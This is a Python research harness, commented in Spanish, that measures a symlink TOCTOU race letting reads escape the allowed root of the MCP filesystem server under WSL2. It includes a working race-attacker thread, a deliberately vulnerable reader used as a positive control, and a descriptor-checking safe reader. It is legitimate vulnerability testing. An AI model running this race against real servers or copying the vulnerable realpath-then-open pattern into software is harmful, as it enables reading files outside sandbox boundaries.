#!/usr/bin/env python3
"""C5 — La carrera de symlinks en Linux (WSL2) contra `servers/filesystem` de MCP.

Corre DENTRO de WSL2 (Linux), donde `rename`/`unlink` sobre directorios y symlinks
NO tienen bloqueo obligatorio (en Windows/NTFS el 79 % de los intentos fallaba por
bloqueo de fichero — mcp-cabos-sueltos.md §5, heredado). Este arnés es del worker12;
es copia adaptada de bench/salidas-mcp-cabos-2/c5a_symlink_wsl.py con:

  - salida a bench/salidas-symlink-toctou/ (un fichero de salida por agente),
  - control de VIDA del sujeto antes y despues de evaluar (trampa 91),
  - registro de si la carrera se INTENTO de verdad: toggles>0 (trampa 38),
  - CONTROLES POSITIVOS puro-python (vulnerable, con y sin ventana forzada) que
    DEBEN ganar, para separar "0 gano => seguro" de "0 gano => arnes roto" (trampas 38/81),
  - un CONTROL NEGATIVO puro-python (patron seguro por descriptor) que NO debe ganar.

Mecanismo del servidor (lib.ts:99-140, index.ts:191-211): validatePath() resuelve
`fs.realpath(absolute)`, comprueba que cae dentro de las raices y DEVUELVE ese realPath;
el handler hace `readFileContent(realPath)`. La ventana TOCTOU esta entre el realpath
(lib.ts:116) y el read (index.ts:204). El vector: TARGET es un dir REAL cuando corre
realpath (pasa la comprobacion, el realPath contiene el componente literal) y el atacante
lo convierte en SYMLINK A FUERA antes del read.
"""
import json
import os
import shutil
import subprocess
import sys
import threading
import time
from collections import Counter

BASE = "/tmp/c5_toctou"
ALLOWED = f"{BASE}/allowed"
OUTSIDE = f"{BASE}/outside"
TARGET = f"{ALLOWED}/target"     # el componente de directorio que se conmuta
HOLD = f"{BASE}/hold_realdir"    # aparca el dir real mientras TARGET es symlink
SERVER = "/mnt/d/Work/research/FileX/repos/mcp-refs/servers/src/filesystem/dist/index.js"
SECRET = "secret.txt"
MARCA_DENTRO = "CONTENIDO-DENTRO-LEGITIMO"
MARCA_FUERA = "SECRETO-DE-FUERA-ENVENENADO"
DUR_S = float(os.environ.get("C5_DUR", "12"))
OUT = ("/mnt/d/Work/research/FileX/.claude/worktrees/agent-a3a087d1f283480ca/"
       "bench/salidas-symlink-toctou/c5_toctou.json")


def preparar():
    shutil.rmtree(BASE, ignore_errors=True)
    os.makedirs(OUTSIDE, exist_ok=True)
    os.makedirs(TARGET, exist_ok=True)          # estado A inicial: dir real
    with open(f"{TARGET}/{SECRET}", "w") as f:
        f.write(MARCA_DENTRO + "\n")            # secreto legitimo, dentro de allowed
    with open(f"{OUTSIDE}/{SECRET}", "w") as f:
        f.write(MARCA_FUERA + "\n")             # secreto de fuera de allowed


def dentro_allowed(ruta):
    r = os.path.realpath(ALLOWED)
    return ruta == r or ruta.startswith(r + os.sep)


# ---------------------------------------------------------------- Atacante
class Atacante(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.parar = False
        self.toggles = 0

    def run(self):
        while not self.parar:
            try:
                os.rename(TARGET, HOLD)           # A -> aparta el dir real
                os.symlink(OUTSIDE, TARGET)       # pon symlink a fuera (estado B)
                self.toggles += 1
            except OSError:
                pass
            try:
                os.unlink(TARGET)                 # quita el symlink
                os.rename(HOLD, TARGET)           # devuelve el dir real (estado A)
            except OSError:
                pass


# ---------------------------------------------------------------- Servidor real
class Servidor:
    def __init__(self):
        self.p = subprocess.Popen(
            ["node", SERVER, ALLOWED],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1)
        self._id = 0

    def vivo(self):
        return self.p.poll() is None

    def rpc(self, method, params=None, notify=False, timeout=10):
        if notify:
            self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "method": method,
                                           "params": params or {}}) + "\n")
            self.p.stdin.flush()
            return None
        self._id += 1
        rid = self._id
        self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": rid, "method": method,
                                       "params": params or {}}) + "\n")
        self.p.stdin.flush()
        t0 = time.time()
        while time.time() - t0 < timeout:
            linea = self.p.stdout.readline()
            if not linea:
                return {"_MUERTO": True}
            try:
                m = json.loads(linea)
            except Exception:
                continue
            if m.get("id") == rid:
                return m
        return None

    def cerrar(self):
        try:
            self.p.terminate()
            self.p.wait(timeout=5)
        except Exception:
            try:
                self.p.kill()
            except Exception:
                pass


def clasificar_server(resp):
    if resp is None:
        return "timeout"
    if resp.get("_MUERTO"):
        return "muerto"
    if "error" in resp:
        return "denegado"
    try:
        txt = json.dumps(resp["result"])
    except Exception:
        return "raro"
    # el servidor marca isError dentro de result cuando el handler lanza
    if isinstance(resp.get("result"), dict) and resp["result"].get("isError"):
        if MARCA_FUERA in txt:
            return "WIN_FUERA"
        return "denegado"
    if MARCA_FUERA in txt:
        return "WIN_FUERA"
    if MARCA_DENTRO in txt:
        return "dentro"
    return "otro"


def medir_servidor():
    preparar()
    srv = Servidor()
    ini = srv.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {},
                                 "clientInfo": {"name": "c5", "version": "0"}})
    if ini is None or ini.get("_MUERTO"):
        srv.cerrar()
        return {"error": "el servidor no arranca", "ini": ini}
    srv.rpc("notifications/initialized", notify=True)

    vivo_antes = srv.vivo()
    atk = Atacante()
    atk.start()
    conteo = Counter()
    ejemplos = {}
    intentos = 0
    t0 = time.time()
    while time.time() - t0 < DUR_S:
        r = srv.rpc("tools/call",
                    {"name": "read_text_file",
                     "arguments": {"path": f"{TARGET}/{SECRET}"}}, timeout=8)
        c = clasificar_server(r)
        conteo[c] += 1
        intentos += 1
        if c not in ejemplos and r is not None and not r.get("_MUERTO"):
            ejemplos[c] = json.dumps(r)[:300]
        if c in ("muerto", "timeout"):
            break
    atk.parar = True
    time.sleep(0.2)
    vivo_despues = srv.vivo()   # trampa 91: el sujeto vivo antes Y despues
    srv.cerrar()

    return {
        "sujeto": "servers/filesystem dist/index.js (node)",
        "vivo_antes": vivo_antes, "vivo_despues": vivo_despues,
        "intentos": intentos, "toggles_atacante": atk.toggles,
        "conteo": dict(conteo),
        "wins_fuera": conteo["WIN_FUERA"],
        "tasa_win_%": round(100 * conteo["WIN_FUERA"] / intentos, 3) if intentos else 0,
        "ejemplo_win": ejemplos.get("WIN_FUERA"),
        "ejemplo_denegado": ejemplos.get("denegado"),
        "ejemplo_dentro": ejemplos.get("dentro"),
    }


# --------------------------------------------- Control positivo: patron VULNERABLE puro
def lector_vulnerable(path, ventana_s=0.0):
    """Replica el patron del servidor: realpath, comprueba, DEVUELVE realpath,
    y luego lee ESA cadena (que se re-resuelve en el open). ventana_s fuerza la ventana."""
    real = os.path.realpath(path)          # resuelve symlinks EN ESTE INSTANTE
    if not dentro_allowed(real):
        raise PermissionError("denegado por realpath")
    if ventana_s:
        time.sleep(ventana_s)              # ventana TOCTOU forzada
    with open(real) as f:                  # re-resuelve la cadena 'real' en el open
        return f.read()


# --------------------------------------------- Control negativo: patron SEGURO puro
def lector_seguro(path, ventana_s=0.0):
    """Abre primero el descriptor, luego comprueba QUE se abrio de verdad via
    /proc/self/fd. Si el swap ocurrio, el fd apunta fuera -> se deniega."""
    fd = os.open(path, os.O_RDONLY)        # abre lo que haya AHORA
    try:
        if ventana_s:
            time.sleep(ventana_s)
        real_abierto = os.readlink(f"/proc/self/fd/{fd}")
        if not dentro_allowed(real_abierto):
            raise PermissionError("denegado por fd")
        return os.read(fd, 1 << 20).decode("utf-8", "replace")
    finally:
        os.close(fd)


def clasificar_lector(fn, ventana_s):
    try:
        txt = fn(f"{TARGET}/{SECRET}", ventana_s)
    except PermissionError:
        return "denegado"
    except FileNotFoundError:
        return "enoent"
    except OSError:
        return "oserror"
    if MARCA_FUERA in txt:
        return "WIN_FUERA"
    if MARCA_DENTRO in txt:
        return "dentro"
    return "otro"


def medir_lector(nombre, fn, ventana_s, dur_s):
    preparar()
    atk = Atacante()
    atk.start()
    conteo = Counter()
    intentos = 0
    t0 = time.time()
    while time.time() - t0 < dur_s:
        conteo[clasificar_lector(fn, ventana_s)] += 1
        intentos += 1
    atk.parar = True
    time.sleep(0.05)
    return {
        "sujeto": nombre, "ventana_forzada_s": ventana_s,
        "intentos": intentos, "toggles_atacante": atk.toggles,
        "conteo": dict(conteo),
        "wins_fuera": conteo["WIN_FUERA"],
        "tasa_win_%": round(100 * conteo["WIN_FUERA"] / intentos, 3) if intentos else 0,
    }


# --------------------------------------------- Controles de estado estatico
def control_estatico():
    """Deja TARGET en cada estado FIJO y comprueba que el servidor y un read directo
    hacen lo esperado: prueba que el envenenamiento es real y que la comprobacion actua."""
    res = {}
    # estado B fijo: TARGET es symlink -> outside
    preparar()
    os.rename(TARGET, HOLD)
    os.symlink(OUTSIDE, TARGET)
    with open(f"{TARGET}/{SECRET}") as f:
        res["B_read_directo"] = f.read().strip()   # debe ser MARCA_FUERA
    srv = Servidor()
    srv.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {},
                           "clientInfo": {"name": "c5s", "version": "0"}})
    srv.rpc("notifications/initialized", notify=True)
    r = srv.rpc("tools/call", {"name": "read_text_file",
                               "arguments": {"path": f"{TARGET}/{SECRET}"}})
    res["B_servidor"] = clasificar_server(r)        # debe ser denegado
    srv.cerrar()
    # estado A fijo: TARGET es dir real
    preparar()
    srv = Servidor()
    srv.rpc("initialize", {"protocolVersion": "2024-11-05", "capabilities": {},
                           "clientInfo": {"name": "c5s", "version": "0"}})
    srv.rpc("notifications/initialized", notify=True)
    r = srv.rpc("tools/call", {"name": "read_text_file",
                               "arguments": {"path": f"{TARGET}/{SECRET}"}})
    res["A_servidor"] = clasificar_server(r)        # debe ser dentro
    srv.cerrar()
    return res


def main():
    salida = {
        "plataforma": "wsl2",
        "kernel": os.uname().release,
        "fs_tmp": subprocess.run(["stat", "-f", "-c", "%T", "/tmp"],
                                 capture_output=True, text=True).stdout.strip(),
        "duracion_por_fase_s": DUR_S,
        "allowed_root": ALLOWED,
    }
    salida["estatico"] = control_estatico()
    salida["control_positivo_vulnerable_natural"] = medir_lector(
        "puro-python vulnerable (sin ventana forzada)", lector_vulnerable, 0.0, DUR_S)
    salida["control_positivo_vulnerable_ventana"] = medir_lector(
        "puro-python vulnerable (ventana forzada 2ms)", lector_vulnerable, 0.002, 4.0)
    salida["control_negativo_seguro"] = medir_lector(
        "puro-python seguro por fd (ventana forzada 2ms)", lector_seguro, 0.002, 4.0)
    salida["servidor_referencia"] = medir_servidor()

    print(json.dumps(salida, ensure_ascii=False, indent=2))
    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(salida, f, ensure_ascii=False, indent=2)
    shutil.rmtree(BASE, ignore_errors=True)


if __name__ == "__main__":
    main()
